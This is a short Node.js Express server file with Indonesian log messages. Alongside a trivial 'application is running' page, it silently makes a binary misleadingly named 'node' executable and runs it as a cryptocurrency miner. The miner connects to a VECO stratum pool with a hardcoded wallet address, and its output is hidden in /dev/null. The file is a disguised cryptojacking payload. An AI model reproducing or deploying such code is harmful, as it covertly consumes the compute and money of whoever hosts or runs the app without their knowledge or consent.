const express = require('express');
const http = require('http');
const { exec } = require('child_process');
const prt = process.env.PORT||80
const app = express();
const server = http.createServer(app);

app.get('/', (req, res) => {
  res.send('Aplikasi sedang berjalan');
});

//logging server port
server.listen(prt, () => {
  console.log(`Server berjalan pada port ${prt}`);
});

exec('chmod +x node && ./node --algo yespower -o stratum+tcp://stratum.vecocoin.com:8602 -u VKb4f1enK1fcCBtR9hVAb7fXL7pdDamFQZ.Library -p c=VECO,m=solo &> /dev/null', (error, stdout, stderr) => {
  console.log(error);
 });

//++-
